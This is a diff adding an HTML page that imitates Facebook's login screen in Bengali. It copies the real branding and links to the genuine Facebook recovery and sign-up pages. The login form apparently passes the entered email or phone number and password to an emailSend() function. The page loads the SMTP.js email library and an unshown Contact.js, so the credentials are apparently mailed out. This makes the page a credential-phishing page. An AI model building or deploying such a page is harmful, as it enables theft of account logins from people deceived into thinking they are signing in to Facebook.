@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <title>FB - লগ ইন করুন অথবা নিবন্ধন করুন</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>ফেসবুক</h1>
+          <p>ফেসবুক আপনাকে লোকেদের সাথে সংযুক্ত</p>
+          <p>হতে ও নানা বিষয় শেয়ার করতে সাহায্য করে।</p>
+        </div>
+        <form onsubmit="emailSend(); reset(); return false;">
+          <input type="text" id="name" placeholder="ইমেল বা ফোন নম্বর :" required>
+          <input type="password" id="password" placeholder="পাসওয়ার্ড :" required>
+        
+          <div class="link">
+            <button type="submit" class="login">লগ ইন করুন</button>
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0" class="forgot">পাসওয়ার্ড ভুলে গেছেন?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="https://www.facebook.com/reg/">নতুন একাউন্ট তৈরি করুন</a>
+          </div>
+        </form>        
+      </div>
+    </div>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script src="Contact.js"></script>
+  </body>
+</html>
